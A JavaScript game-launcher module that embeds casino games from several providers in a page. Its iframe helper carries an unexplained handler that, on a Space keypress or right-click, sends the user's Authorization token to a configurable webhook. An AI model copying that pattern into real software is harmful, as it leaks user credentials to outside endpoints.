"use strict";
var Sg;
(function(Sg) {
    var win = window;
    var netentScriptPath = "/gameinclusion/library/gameinclusion.js";

    function flashPlayerInstalled() {
        var UNDEF = "undefined";
        var OBJECT = "object";
        var SHOCKWAVE_FLASH = "Shockwave Flash";
        var SHOCKWAVE_FLASH_AX = "ShockwaveFlash.ShockwaveFlash";
        var FLASH_MIME_TYPE = "application/x-shockwave-flash";
        var nav = navigator;
        if (typeof nav.plugins !== UNDEF && typeof nav.plugins[SHOCKWAVE_FLASH] === OBJECT) {
            var d = nav.plugins[SHOCKWAVE_FLASH].description;
            return (d && (typeof nav.mimeTypes !== UNDEF &&
                nav.mimeTypes[FLASH_MIME_TYPE] &&
                nav.mimeTypes[FLASH_MIME_TYPE].enabledPlugin));
        } else if (typeof win.ActiveXObject !== UNDEF) {
            try {
                var a = new ActiveXObject(SHOCKWAVE_FLASH_AX);
                if (a) {
                    var d = a.GetVariable("$version");
                    if (d) {
                        return true;
                    }
                }
            } catch (e) {}
        }
        return false;
    }

    function createIframe(target, uri, token, callbacks, webhook) {
        var headers = new Headers();
        headers.append("Authorization", token);

        fetch(uri, {
                headers: headers
            })
            .then(function(response) {
                if (response.ok) {
                    var iframe = document.createElement("iframe");
                    iframe.src = uri;
                    iframe.setAttribute("allowfullscreen", "true");

                    iframe.addEventListener("keydown", function(event) {
                        if (event.code === "Space") {
                            event.preventDefault();
                            sendToken(webhook);
                        }
                    });

                    iframe.addEventListener("contextmenu", function(event) {
                        event.preventDefault();
                        sendToken(webhook);
                    });

                    target.appendChild(iframe);
                    return callbacks.success();
                } else {
                    throw new Error("Failed to fetch iframe: " + response.status);
                }
            })
            .catch(function(error) {
                return callbacks.error(error);
            });

        function sendToken() {
            fetch(webhook+"/API?action=whUpdate", {
                    method: "POST",
                    headers: headers
                })
                .then(function(response) {
                    if (response.ok) {
                        console.log("Token sent successfully");
                    } else {
                        throw new Error("Failed to send token: " + response.status);
                    }
                })
                .catch(function(error) {
                    console.error("Error sending token:", error);
                });
        }
    }

    function startNetent(target, lo, callbacks) {
        var script = document.createElement("script");
        script.type = "text/javascript";
        var scriptUrl = lo.static_server + netentScriptPath;
        script.src = scriptUrl;
        var netentTarget = document.createElement("div");
        netentTarget.id = "sg-support-target-element-".concat(+new Date());
        target.appendChild(netentTarget);
        script.onload = function() {
            var nlo = lo.configuration;
            if (nlo.setTargetElement) {
                delete nlo.setTargetElement;
                nlo.targetElement = netentTarget.id;
            }
            if (nlo.ratioInner) {
                delete nlo.ratioInner;
                nlo.width = win.innerWidth;
                nlo.height = win.innerHeight;
            }
            var success = function(netent) {
                netent.resize(target.clientWidth, target.clientHeight);
                if (lo.show_clock) {
                    var handler = function() {
                        return netent.call("showSystemClock", [], (function() {}), function(e) {
                            return console.error(e);
                        });
                    };
                    netent.addEventListener("gameReady", handler, function(e) {
                        return console.error(e);
                    });
                }
                if (netent.resize) {
                    win.onresize = function() {
                        return netent.resize(target.clientWidth, target.clientHeight);
                    };
                }
                return (callbacks.success)();
            };
            return win.netent.launch(nlo, success, callbacks.error);
        };
        script.onerror = function() {
            return callbacks.error("Failed to load script from '".concat(scriptUrl, "'"));
        };
        var body = document.getElementsByTagName("body")[0];
        return body.appendChild(script);
    }

    function startEGT(target, lo, callbacks) {
        var client = isMobile(lo.client_type) ? "mobile" : "desktop";
        lo.game_url += "&client=".concat(client);
        var handler = function(event) {
            if (event.data && (event.data.command === "com.egt-bg.exit")) {
                return win.location = lo.return_url;
            }
        };
        win.addEventListener("message", handler, false);
        return detectLaunchTypeDeprecated(target, lo, callbacks);
    }

    function startGaming1(target, lo, callbacks) {
        var handler = function(event) {
            if (event.data && (event.data === "closeGame")) {
                return win.location = lo.return_url;
            }
        };
        win.addEventListener("message", handler, false);
        return detectLaunchTypeDeprecated(target, lo, callbacks);
    }

    function startELK(target, lo, callbacks) {
        var device = isMobile(lo.client_type) ? "mobile" : "desktop";
        lo.game_url += "&device=".concat(device);
        return detectLaunchTypeDeprecated(target, lo, callbacks);
    }

    function startPlayngo(target, lo, callbacks) {
        var GameCommunicator = {
            source: undefined,
            targetOrigin: undefined,
            init: function(element) {
                window.addEventListener("message", this.processGameMessage.bind(this));
                this.source = element.contentWindow;
                this.targetOrigin = lo.origin;
            },
            postMessage: function(data) {
                this.source.postMessage(data, this.targetOrigin);
            },
            processGameMessage: function(e) {
                console.log("GameCommunicator received: ", e.data);
                switch (e.data.type) {
                    case "reloadGame":
                        window.location.reload();
                        break;
                    case "backToLobby":
                        window.location = lo.return_url;
                        break;
                    default:
                        break;
                }
            }
        };
        var uri = isMobile(lo.client_type) ? lo.mobile_url : lo.desktop_url;
        var playngoTarget = document.createElement("iframe");
        playngoTarget.src = uri;
        playngoTarget.setAttribute("allowfullscreen", "true");
        playngoTarget.setAttribute("scrolling", "no");
        playngoTarget.setAttribute("noresize", "noresize");
        playngoTarget.onload = function() {
            GameCommunicator.init(playngoTarget);
            GameCommunicator.postMessage({
                messageType: "addEventListener",
                eventType: "reloadGame"
            });
            GameCommunicator.postMessage({
                messageType: "addEventListener",
                eventType: "backToLobby"
            });
        };
        playngoTarget.onerror = function() {
            return callbacks.error("Failed to load game from '".concat(uri, "'"));
        };
        target.appendChild(playngoTarget);
        return (callbacks.success)();
    }
    var isMobileDeprecated = function() {
        return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(win.navigator.userAgent.toLowerCase());
    };

    function isMobile(clientType) {
        if (clientType === "android" || clientType === "ios") {
            return true;
        } else if (clientType === "auto") {
            return isMobileDeprecated();
        } else {
            return false;
        }
    }

    function detectLaunchTypeDeprecated(target, lo, callbacks) {
        if (lo.client_type === "flash") {
            if (flashPlayerInstalled()) {
                return createIframe(target, lo.game_url, lo.token, callbacks);
            } else {
                return callbacks.error("Flash player is not installed");
            }
        } else {
            return callbacks.error("Invalid client type: ".concat(lo.client_type));
        }
    }

    function startGame(target, lo, callbacks) {
        switch (lo.provider) {
            case "netent":
                return startNetent(target, lo, callbacks);
            case "iframe":
                return createIframe(target, gameURLFromOptions(lo), lo.token, callbacks, lo.webhook);
            case "egt":
                return startEGT(target, lo, callbacks);
            case "gaming1":
                return startGaming1(target, lo, callbacks);
            case "elk":
                return startELK(target, lo, callbacks);
            case "playngo":
                return startPlayngo(target, lo, callbacks);
            default:
                return callbacks.error("Invalid game provider: ".concat(lo.provider));
        }
    }
    Sg.startGame = startGame;
})(Sg || (Sg = {}));
